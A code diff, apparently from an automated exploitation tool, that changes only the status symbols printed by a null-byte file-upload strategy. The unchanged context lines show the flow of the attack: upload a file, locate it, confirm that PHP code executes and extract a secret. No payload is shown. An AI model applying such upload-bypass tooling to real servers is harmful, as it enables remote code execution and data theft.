@@ -141,10 +141,10 @@ class NullByteUploadStrategy(Strategy):
         )
         
         if not upload_success:
-            print(f"      [✗] Upload rejected (HTTP {upload_response.status_code})")
+            print(f"      [-] Upload rejected (HTTP {upload_response.status_code})")
             return StrategyStatus.FAILURE
         
-        print(f"      [✓] Upload accepted (HTTP {upload_response.status_code})")
+        print(f"      [+] Upload accepted (HTTP {upload_response.status_code})")
         
   
         stored_filename = self._extract_filename(upload_response, observations)
@@ -160,10 +160,10 @@ class NullByteUploadStrategy(Strategy):
         file_url = self._find_uploaded_file(stored_filename)
         
         if not file_url:
-            print("      [✗] File not accessible")
+            print("      [-] File not accessible")
             return StrategyStatus.INCONCLUSIVE
         
-        print(f"      [✓] File accessible at: {file_url}")
+        print(f"      [+] File accessible at: {file_url}")
         
         print("      [*] Checking execution...")
         
@@ -189,10 +189,10 @@ class NullByteUploadStrategy(Strategy):
         )
         
         if code_executed:
-            print("      [✓] PHP CODE EXECUTED!")
+            print("      [+] PHP CODE EXECUTED!")
         
             secret = access_response.text.strip()
-            print(f"      [✓] Secret extracted: {secret[:50]}...")
+            print(f"      [+] Secret extracted: {secret[:50]}...")
 
             context.secret = secret
 
@@ -217,7 +217,7 @@ class NullByteUploadStrategy(Strategy):
             return StrategyStatus.SUCCESS
         
         else:
-            print("      [✗] PHP not executed (source code visible)")
+            print("      [-] PHP not executed (source code visible)")
             return StrategyStatus.FAILURE
     
     def _get_safe_extension(self, context) -> str:
